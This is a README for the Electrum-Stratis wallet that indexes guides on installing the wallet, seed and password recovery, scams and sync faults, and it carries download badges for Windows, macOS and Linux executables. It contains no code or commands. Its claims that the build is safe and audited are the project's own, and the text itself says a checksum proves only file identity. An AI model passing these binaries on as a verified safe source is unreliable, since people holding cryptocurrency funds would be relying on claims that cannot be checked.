![Electrum-Stratis](assets/banner-hub.png)

# Electrum-Stratis guides

<p align="center">Every Electrum-Stratis guide, in one place</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions and checksums are on the [v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

---

This repository is the entry point to every Electrum-Stratis guide, and the place to start if you have just arrived with a legacy STRAT balance and no clear idea which instructions still apply. The wallet is a self-custody desktop application for the legacy Stratis chain, forked from Electrum and released under the MIT licence. It runs on Windows, macOS and Linux, keeps keys on the machine you installed it on, restores from a seed written on paper, and moves coins that wallets built for the current chain cannot see.

The guides are grouped by the question a reader arrives with, not by the order they were written. Installation and build identity come first, because a reader who has downloaded the wrong file is debugging the wrong problem. Recovery comes next: the seed, the wallet file and the password are three different objects and each one fails in its own way. Security and trust follow, then the connection and balance faults that look like lost funds but are not.

Two rules hold across every page here. The first is that each guide states its answer in the first sentence, so you can stop reading as soon as you have what you need. The second is that nothing in this repository asks for a seed, a private key or a wallet file. Any page, message or paid offer that asks for one is not part of this project, whatever it claims.

Every guide is self-contained: you do not need to read the set in order, and the cross-links are there for the next question rather than as prerequisites.

Before you install anything, compare the file you downloaded with the SHA-256 value published on the release page. That comparison is the only integrity check available to a reader, and it answers a narrower question than most people expect: it tells you the file is the file the project published, not that the code is safe. The build itself is described as audited and signed in the project's own wording; the checksum is what you can verify yourself in a terminal on any of the three platforms, without trusting this page.

## Start here

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Install Electrum Stratis on Windows, step by step](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/install-on-windows-walkthrough.md) | first run on Windows |
| [Is Electrum Stratis safe to use in 2026?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/how-safe-is-the-desktop-wallet.md) | verification and keys |
| [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/seed-file-and-password-backups.md) | three backups |

</div>


## Start here: the product and the chain

<div align="center">

| Guide | What it answers |
| --- | --- |
| [What Electrum Stratis actually is](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/what-this-wallet-is.md) | the product, the chain and the fork |
| [STRAT is not STRAX: what the rename changed, and which one this wallet holds](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/why-strat-and-strax-differ.md) | two assets, one brand |
| [Is Electrum a Bitcoin wallet? Yes - and that is why this question matters](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/is-it-a-bitcoin-wallet.md) | Electrum versus this fork |
| [Does Stratis still support the Electrum wallet?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/is-the-wallet-still-maintained.md) | maintenance and releases |
| [Where your address lives, and why it never changes](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/where-a-wallet-address-comes-from.md) | addresses and restores |
| [Standard, multisig and imported wallets: what the three types mean](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/standard-multisig-imported-wallets.md) | three wallet types |

</div>


## Install and build identity

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Where to download Electrum Stratis in 2026](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/where-to-get-the-current-build.md) | the one download page |
| [Which version is current, and is mine real?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/which-release-is-current.md) | build identity |
| [Install Electrum Stratis on Windows, step by step](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/install-on-windows-walkthrough.md) | first run on Windows |
| [Could not import PyQt4: installing Electrum Stratis on Linux](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/linux-pyqt4-error-fix.md) | the replaced library |
| [macOS, iOS and Android: which platforms Electrum Stratis actually runs on](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/macos-ios-android-what-exists.md) | platforms that exist |

</div>


## Security and trust

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Is Electrum Stratis safe to use in 2026?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/how-safe-is-the-desktop-wallet.md) | verification and keys |
| [The 2018 seed flaw: what it was, and what it means now](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/the-2018-seed-flaw.md) | the flaw and its fix |
| [Was my wallet affected by the 2018 seed flaw?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/was-my-seed-affected.md) | provenance test |
| [Seed entry was never necessary: the red flag, and the tool that proved it](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/why-no-flow-needs-a-seed.md) | the anti-phishing rule |
| [What can be stolen from a wallet, and what cannot](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/what-a-thief-can-actually-take.md) | keys versus addresses |
| [Why trusted wallet lists cannot tell you what you need to know](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/why-trusted-wallet-lists-fail.md) | verification over rankings |
| [The scam variants aimed at wallet holders, and the one test that stops them...](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/scams-that-promise-funds-back.md) | the scripts and the ask |

</div>


## Recovery and backups

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/seed-file-and-password-backups.md) | three backups |
| [Is the seed enough to restore the wallet?](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/is-the-seed-enough-to-restore.md) | what a phrase covers |
| [The .dat file that is not in your Electrum Stratis folder](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/wallet-file-not-in-the-folder.md) | file locations |
| [Forgot the wallet password but still have the seed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/forgot-password-but-have-the-seed.md) | restore path |
| [Electrum Stratis password recovery: what is possible and what is not](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/password-cannot-be-recovered.md) | no reset exists |
| [Stratis wallet login pages that do not exist, and what to do instead](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/there-is-no-login-page.md) | no account |
| [Password prompts you cannot satisfy: why they appear and what unlocks them](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/password-prompts-you-never-set.md) | prompt meanings |
| [What wallet recovery can and cannot do](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/limits-of-a-restore.md) | what cannot be done |
| [Restore, import or sweep: choosing the right recovery action](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/restore-import-or-sweep.md) | three verbs |

</div>


## The Qt wallet and the closed conversion

<div align="center">

| Guide | What it answers |
| --- | --- |
| [The Qt wallet does not work with a seed: moving STRAT into Electrum Stratis](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/qt-wallet-has-no-seed.md) | key-based wallet |
| [dumpprivkey to Sweep: moving coins out of the Qt wallet, in order](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/export-a-key-and-sweep-it.md) | dumpprivkey order |
| [Coins sent to Core 2.2.1: what the balance is waiting for](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/coins-sent-to-core-wallet.md) | full node waiting |
| [Why not just use the native wallet?](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/why-not-use-the-native-wallet.md) | two designs |
| [The swap is closed: what that means for coins still held](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/the-conversion-window-is-closed.md) | closed service |
| [1:10, off-chain, and the CSV that confirmed it](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/the-fixed-conversion-ratio.md) | record, not rate |
| [There is no page for swapping with an old seed, because it never existed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/no-conversion-needed-a-seed.md) | the missing page |
| [The paper wallet that could not be swept](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/paper-wallet-that-cannot-be-swept.md) | printouts |
| [Crypto recovery scams: what no app, service or DM can do](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/HEAD/paid-services-that-promise-funds-back.md) | why the offer is the fraud |

</div>


## Connection, balance and transactions

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Why does Electrum Stratis say Not Connected?](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/wallet-says-not-connected.md) | peer connection |
| [The server list and the cloud node: choosing a peer that works](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/the-server-list-explained.md) | probe and reorder |
| [The Use SSL toggle: what it does, and why turning it off is not a fix](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/the-use-ssl-toggle.md) | what it costs |
| [Restored from seed and still not connected: what the restore did and did no...](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/restored-but-still-offline.md) | restore versus connection |
| [STRAX wallet for Windows not syncing: this wallet cannot hold STRAX](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/strax-wallet-will-not-sync.md) | wrong chain |
| [Why is my balance missing? Three causes, and how to tell them apart](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/balance-is-missing.md) | three causes |
| [Core with zero peers: Processed 0 out of 0 blocks](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/core-shows-zero-peers.md) | empty queue |
| [Synced but 170,000 blocks behind: the stale peer](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/synced-to-a-stale-peer.md) | height and age |
| [bad-txns-inputs-spent, and the other reasons a send is rejected](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/HEAD/transaction-was-rejected.md) | five rejections |

</div>


## Staking, fees and comparisons

<div align="center">

| Guide | What it answers |
| --- | --- |
| [The 1567-day countdown, explained](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/the-1567-day-lock.md) | staking lock length |
| [Ledger and cold staking: what actually worked](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/cold-staking-with-a-hardware-wallet.md) | two-key staking |
| [Moving coins between wallets without losing fees to it](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/move-coins-without-wasting-fees.md) | fees and inputs |
| [Does Stratis work only on STRAX now?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/does-the-legacy-chain-still-run.md) | chain liveness |
| [Sparrow or Electrum: an honest comparison, with a Stratis note](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/sparrow-compared-with-this-wallet.md) | one comparison |
| [Electrum alternatives, sorted by what you actually need](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/alternatives-by-category.md) | custody models |
| [How do I sell Bitcoin from Electrum? - this wallet cannot, and neither ca...](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/sell-bitcoin-from-a-wallet.md) | why a wallet cannot sell |
| [Why every price you see is quoted in STRAX, not STRAT](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/HEAD/why-prices-are-quoted-in-strax.md) | what a price does and does not value |

</div>


## About

Electrum-Stratis is a self-custody desktop wallet for the legacy Stratis chain, forked from Electrum and released under the MIT licence.

MIT licensed. No page in this repository asks for a seed or a private key.
